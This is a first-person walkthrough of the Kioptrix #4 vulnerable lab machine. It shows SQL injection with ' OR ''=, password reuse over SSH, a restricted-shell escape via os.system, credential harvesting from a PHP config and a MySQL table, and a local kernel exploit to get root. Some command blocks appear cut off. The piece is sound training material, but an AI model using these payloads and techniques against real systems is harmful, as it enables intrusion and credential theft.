So we've reached [Kioptrix #4](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/).  I felt much more confident this time than before, so whilst before I've had to rely on other walkthroughs to guide myself to an answer if I felt I wasn't getting anywhere, here I resolved to spend as long as possible actually enumerating everything before I resorted to it.  


Begin
-----

As is tradition, Kioptrix #4 has been loaded up on our box, so lets work out it's IP address.  Networking on both boxes went to complete hell so I spent an embarassing amount of time debugging dhcp and dns issues this time.

```bash
root@kali:~# arp-scan -l
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9: 256 hosts scanned in 1.861 seconds (137.56 hosts/sec). 3 responded
```

Next port of call lets do an nmap scan.

```bash
root@kali:~# nmap -A 192.168.137.135

Again, there's an open ssh port and a http server. Further there were two samba servers running.  

SMB Aside
---------
To cut a long story short on these, I attempted to break in through these when other attempts were failing but didn't really get anywhere, and honestly I got stuck trying to actually mount the samba share but I'll include the commands I tried running if anyone wants to correct me or just as a reference for myself in the future.  I don't know if this was actually a viable exploit vector but I spent a while on it so just in case I have to do all this in the future.

```bash

I ran dirb on the directory before trying anything else.

```bash

After looking around nothing looked easily exploitable so now seemed like a good time to try out some SQL injection.  This one actually took me a while, as while I do have a general idea how it works actually crafting my own query was quite difficult.  

With some help from some beginner guides I realised after going through all the error pages that the password field was injectable but the username field was not.  The reason for this was the username field yielding urls like [
http://192.168.137.135/member.php?username=\%27%20OR%20\%27\%27=\%27](http://192.168.137.135/member.php?username=\%27%20OR%20\%27\%27=\%27), which has the quotation marks escaped.

From the dirb results it was reasonable to assume that john was a user on the box so I tried that.

**Username**: john\\
**Password**: ' OR ''=

![What the hell](/assets/images/kioptrix4/2.png)

Well, that's the oddest user control panel I've ever seen, but what the hell, we got creds.

SSH of Doom
-----------
So I had creds for some useless web app, but hopefully password reuse is in full effect, so I attempted to SSH into the box.  Lo and behold.

```bash
root@kali:~# ssh -l john 192.168.137.135
The authenticity of host '192.168.137.135 (192.168.137.135)' can't be established.

Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.137.135' (RSA) to the list of known hosts.
john@192.168.137.135's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==

Type '?' or 'help' to get the list of allowed commands
john:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
john:~$ echo $PATH
*** forbidden path -> "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
```

So, looks like we're heavily restricted, but we're on the box at least.

This one had me stumped for absolutely ages to be honest, with certain results sending me down completely the wrong path. 
```bash
john:~$ echo $SHELL
*** forbidden path -> "/bin/kshell"
```
From that I ended up thinking some really obscure shell program was installed and just spent absolutely ages on completely the wrong solution.  

```bash
john:~$ sudo
Traceback (most recent call last):
  File "/bin/kshell", line 27, in <module>
    lshell.main()
  File "/usr/lib/python2.5/site-packages/lshell.py", line 1219, in main
    cli.cmdloop()
  File "/usr/lib/python2.5/site-packages/lshell.py", line 410, in cmdloop
    stop = self.onecmd(line)
  File "/usr/lib/python2.5/site-packages/lshell.py", line 531, in onecmd
    func = getattr(self, 'do_' + cmd)
  File "/usr/lib/python2.5/site-packages/lshell.py", line 132, in __getattr__
    if self.check_secure(self.g_line, self.conf['strict']) == 1: 
  File "/usr/lib/python2.5/site-packages/lshell.py", line 247, in check_secure
    if cmdargs[1] not in self.conf['sudo_commands'] and cmdargs:
TypeError: 'NoneType' object is unsubscriptable
Connection to 192.168.137.135 closed.
```
And then [this](https://github.com/ghantoos/lshell) came up.  To be honest it took a bit of nudging and very careful googling to give me a hint that I was going in the wrong direction.  

There is an exploit for this version of lshell, and while I could get it to work escaping the shell, I couldn't wget any wanted scripts or do anything of any real use on the box without it hanging.  However, we know we can input commands, so with some more careful googling:

```bash
root@kali:~/Documents# ssh 192.168.137.135 -l john
john@192.168.137.135's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ echo os.system('/bin/bash')
```

Well that works, and now we have a shell but we need to escalate our privileges.  

So I thought it would be a good idea to check out /var/www/ and see if I could harvest credentials.  Checklogin.php had the database ones we needed.
```php
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name
```

So I loaded up mysql and sought after some credentials.  In the members table we get what we're looking for.

```mysql
mysql> SELECT * FROM members;
+----+----------+-----------------------+
| id | username | password              |
+----+----------+-----------------------+
|  1 | john     | MyNameIsJohn          | 
|  2 | robert   | ADGAdsafdfwt4gadfga== | 
+----+----------+-----------------------+
2 rows in set (0.00 sec)
```

So I hoped maybe I could use roberts credentials to get a higher level of privilege, but alas he has exactly the same restrictions as john.

Exploit
---------

After a lot of searching I decided to see if a kernel exploit existed.
```bash
robert@Kioptrix4:/$ cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04.3 LTS"

Linux version 2.6.24-24-server
robert@Kioptrix4:/$ uname -a
Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
```

So it's an x86 linux won version 2.6.24, I wonder if there's an exploit around (It's old so probably).  In the end, after trying a few, [this sendpage exploit](https://www.exploit-db.com/exploits/9545/) ended up working.

```bash
root@kali:~# sudo apt-get install libc6-dev-i386
kali:~# cp /usr/share/exploitdb/platforms/linux/local/9545.c .
root@kali:~# gcc 9545.c -o newexp -m32
root@kali:~#
```

I then opened up a python server on the directory and wget'd it to the tmp directory.

```bash
robert@Kioptrix4:/tmp$ wget 192.168.137.131:8000/newexp
--16:45:35--  http://192.168.137.131:8000/newexp
           => `newexp'

robert@Kioptrix4:/tmp$ ./newexp
# id
uid=0(root) gid=0(root) groups=1002(robert)
```
Yay, we got root!

```bash
# cat congrats.txt
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

Thanks for playing,

```

This was an absolutely fantastic box and I feel like I learnt a tonne going through it.  Now on to Kioptrix 5.
